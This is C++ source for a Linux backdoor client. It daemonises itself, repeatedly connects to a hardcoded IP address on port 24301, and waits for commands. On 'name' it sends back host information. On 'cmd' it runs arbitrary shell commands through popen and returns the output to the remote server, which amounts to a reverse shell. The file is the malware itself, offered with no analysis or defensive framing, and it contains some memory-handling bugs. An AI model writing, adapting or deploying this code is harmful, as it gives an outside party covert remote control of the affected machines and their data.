#include<iostream>
#include <cstdio>
#include<string.h>
#include<netinet/in.h>
#include<stdlib.h>
#include<sys/socket.h>
#include<arpa/inet.h>
#include<unistd.h>
#include <sys/utsname.h>
#include <errno.h> 
#include <sys/stat.h>
#include "globaldef.h"
#include "BlockingQueue.h"
#include <bits/signum.h>
#include <signal.h>
#define SERVPORT 24301
#define MAXDATASIZE 1000
#define SERVER_IP "123.207.157.21"
#define MAXFILE 65535
using namespace std;
pthread_t sendTid;
int sockfd;
int conn;
BlockingQueue<string>* sendqueue;
string cmd_system(char* command);
void* Send(void* ptr);
void* Execute(void* ptr);
void SendExit(int i);
void nonehandle(int i);
int main()
{
	pid_t pc, pid;
	pc = fork();
	if (pc < 0)
	{
		cout << ("error fork") << endl;
		exit(1);
	}
	else if (pc > 0)
	{
		sleep(5);
		exit(0);
	}
		
	
	pid = setsid(); //第二步
	if (pid < 0)
		perror("setsid error");
	chdir("/"); //第三步
	umask(0); //第四步
	for (int i = 0; i < MAXFILE; i++) //第五步
		close(i);
	while (1)
	{

		struct sockaddr_in serv_addr;
		if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
		{
			//cout<<"socket error"<<endl;
			sleep(15);
			continue;
		}
		bzero(&serv_addr, sizeof(serv_addr));
		serv_addr.sin_family = AF_INET;
		serv_addr.sin_port = htons(SERVPORT);
		serv_addr.sin_addr.s_addr = inet_addr(SERVER_IP);
		if (connect(sockfd, (struct sockaddr*)&serv_addr, sizeof(struct sockaddr)) == -1)
		{
			cout<<"connect failed"<<endl;
			sleep(2);
			continue;
		}
		else
		{
			conn = 1;
			sendqueue = new BlockingQueue<string>();
			pthread_create(&sendTid,NULL,Send,NULL);
		}
		while (1)
		{
			
			char* buf=NULL;
			if (recvLenAndData(sockfd, buf) == -1)
			{
				conn = 0;
				cout << "disconn" << endl;
				pthread_kill(sendTid, SIGCHLD);
				break;
			}
			
			if ((string)buf == "name")
			{
					//获取主机信息
					char computer[256];
					struct utsname uts;
					if (gethostname(computer, 255) == 0 && uname(&uts) >= 0)
					{
						//cout<<"gethost"<<endl;
						string info = computer;
						info += " ";
						info += uts.sysname;
						info += " ";
						info += uts.nodename;
						sendqueue->push(info);
					}
			}
			else if ((string)buf == "close")
			{
				conn = 0;
				cout << "disconn" << endl;
				pthread_kill(sendTid, SIGCHLD);
				shutdown(sockfd, SHUT_RDWR);
				close(sockfd);
				exit(0);
				break;
			}
			else if ((string)buf == "cmd")
			{
				char* cmd;
				if (recvLenAndData(sockfd, cmd) == 0)
				{
					
					conn = 0;
					cout << "disconn" << endl;
					pthread_kill(sendTid, SIGCHLD);
					
					break;
				}
				//cout << cmd << endl;
				pthread_t tid;
				pthread_create(&tid, NULL, Execute, cmd);
			
			}
			if(buf!=NULL)
			delete buf;
		}
		shutdown(sockfd, SHUT_RDWR);
		close(sockfd);
	}
}
void nonehandle(int i)
{
	
}
void* Execute(void* ptr)
{
	char* cmd =(char*)ptr;
	string result = cmd_system(cmd);
	if (result.length() > 0)
	{
		//cout << result << endl;
		sendqueue->push(result);
	}
	else
	{
		sendqueue->push("ok");
	}
	if (cmd != NULL)
	{	
		delete cmd;
	}
}
void* Send(void* ptr)
{
	signal(SIGCHLD,SendExit);
	while (true)
	{
		string msg;
		sendqueue->pop(msg);
		sendLenAndData(sockfd, msg);
	}
}
void SendExit(int i)
{
	if (conn == 0)
	{
		cout << "send thread exit" << endl;
		pthread_exit(PTHREAD_CANCELED);
		delete[] sendqueue;
	}
}
string cmd_system(char* command)
{
	signal(SIGCHLD, nonehandle);
	if (command[0] == 'c' && command[1] == 'd')
	{
		string dir(command, 3, sizeof(command));
		chdir(dir.c_str());
		return "ok";
	}
	else
	{
		string result = "";
		FILE* fpRead;
		char* temp=new char[strlen(command)+5];
		strcat(temp, command);
		strcat(temp, " 2>&1");
		fpRead = popen(temp, "r");
		char buf[1024];
		memset(buf, '\0', sizeof(buf));
		while (fgets(buf, sizeof(buf), fpRead) != NULL)
		{
			result += buf;
		}
		if (fpRead != NULL)
			pclose(fpRead);
		delete temp;
		return result;
	}
}

